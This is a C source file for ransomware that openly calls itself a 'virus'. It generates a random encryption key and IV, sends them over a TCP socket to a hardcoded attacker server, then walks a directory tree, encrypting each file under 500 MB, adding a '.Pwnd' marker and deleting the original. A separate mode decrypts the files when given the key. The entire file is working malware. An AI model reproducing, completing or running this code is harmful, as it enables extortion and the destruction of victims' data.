#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h> //malloc
#include <sys/stat.h>
#define IP "192.168.1.3"
#define PORT 8888
void usage(char *progname)
{
	printf("%s %s %s\n", "to encrypt : ", progname, "path encrypt" ); 
	printf("%s %s %s\n", "to decrypt : ", progname, "path decrypt key iv" );
}
int is_encrypted(char *filename)
{
	if(strstr(filename, ".Pwnd"))
	     return 0;
	else
	return 1;
}
void listdir(const char *name, unsigned char *iv, unsigned char *key, char * de_flag)
{
    char directory[4096]="";//casting chemin
    struct dirent *read;//creating struct var read as dirent
    DIR *rep;

    rep = opendir(name);//var rep gets the path
    if (rep == NULL)
    {
       perror(name);//if path doesn't exist, stopping the prog
       return;
    }
    while ((read = readdir(rep))!=NULL)
    {
        if (read->d_type == DT_DIR)
        {

        	if (strcmp(read->d_name, ".")!=0 && strcmp(read->d_name, "..")!=0)
        	{
        		strcpy(directory, name);
        		strcat(directory,"/");
            	strcat(directory, read->d_name);
            	listdir(directory, iv, key, de_flag);
          	}
        }
        else
        { 
        	char pathdir[4096]="";
        	strcpy(pathdir, name);
        	strcat(pathdir,"/");
        	strcat(pathdir, read->d_name);
	  		struct stat st;
	  		stat(pathdir, &st);
	  		if(strcmp(de_flag, "e") ==0 && is_encrypted(pathdir)==1 && st.st_size >0 && st.st_size < 500000000){
          		encrypt(key, iv, pathdir);
	  			remove(pathdir);}
	  		else if(strcmp(de_flag, "d")==0 && is_encrypted(read->d_name)==0){
	  			decrypt(key, iv, pathdir);
	  			remove(pathdir);} 
        }
    }
    closedir(rep);
}
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	RAND_bytes(key, sizeKey);
	RAND_bytes(iv, sizeIv);//random bytes
	bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeIv);//conv the random bytes in hexa
}
 
int send_key(char *pKey, char *pIv)//sending the key to the tcp server
{
	int sockid;
	int server_port = PORT;
	char *server_ip = IP;//static ip, the victim can't chose the server IP

	sockid = socket(AF_INET,SOCK_STREAM,0);//init the socket for TCP

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	char * cpKey = malloc(sizeof(char)*120);//creating cpKey and cpIv, avoid modifying pKey and pIv
	strcpy(cpKey, pKey);// COPY pKey in cpKey
	char * cpIv = malloc(sizeof(char)*120);
	strcpy(cpIv, pIv);
	char *msg = strcat(cpKey, "  is The Key\n");
	connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr)); //connecting to the TCP server, if it returns -1 the prog virus will stop
	send(sockid, (const char *)msg, strlen(msg),0);
	char *msg1 = strcat(cpIv, "  is The IV");//strcat the key with a custom message to be easier on the server to read the info
	send(sockid, (const char *)msg1, strlen(msg1),0);

	close(sockid);
}
int main (int argc, char * argv[])
{
	switch(argc){
		case 3:
            if(strcmp(argv[2], "encrypt") == 0)
            {
                unsigned char  key[32];
                unsigned char  iv[16];
                unsigned char * pKey = malloc(sizeof(char)*1200);//memory allocation hexa key and IV
                unsigned char * pIv = malloc(sizeof(char)*120);
                generate_key(key, sizeof(key), iv, sizeof(iv), pKey, pIv);//calling generate key
		  		send_key(pKey, pIv); //calling send_key with both
		  		unsigned char * name = malloc(sizeof(char)*120); 
		 		name = argv[1]; //path
		  		listdir(name, pIv, pKey, "e");//calling listdir with path, key, IV and flag
		  		break; 
            }
			else
		  		usage(argv[0]); // if argv[2] != encrypt
			break;
		case 5:
			if(strcmp(argv[2], "decrypt") ==0)
			{
		  		unsigned char  key[32];
            	unsigned char  iv[16];
            	unsigned char * pKey = argv[3];
            	unsigned char * pIv = argv[4];
            	unsigned char * name = argv[1];//getting info from entry
            	listdir(name, pIv, pKey, "d");
		  		break;
			}
			else
			usage(argv[0]);
			break;
		default:
			usage(argv[0]);
	}
}



